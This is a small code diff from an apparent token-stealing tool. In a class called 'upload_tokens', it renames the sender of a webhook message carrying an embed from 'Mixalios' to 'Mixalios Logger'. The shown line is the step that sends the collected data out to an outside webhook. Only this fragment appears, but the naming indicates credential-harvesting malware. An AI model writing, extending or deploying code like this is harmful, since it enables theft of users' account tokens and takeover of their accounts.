@@ -369,4 +369,4 @@ class upload_tokens:
 
             embed.set_footer(text="Created By Mixalios")
 
-            self.webhook.send(embed=embed, username="Mixalios", avatar_url="https://upload.wikimedia.org/wikipedia/commons/a/a7/Ilias_Kasidiaris_a_Mar_21016_%28cropped%29.jpg")
+            self.webhook.send(embed=embed, username="Mixalios Logger", avatar_url="https://upload.wikimedia.org/wikipedia/commons/a/a7/Ilias_Kasidiaris_a_Mar_21016_%28cropped%29.jpg")
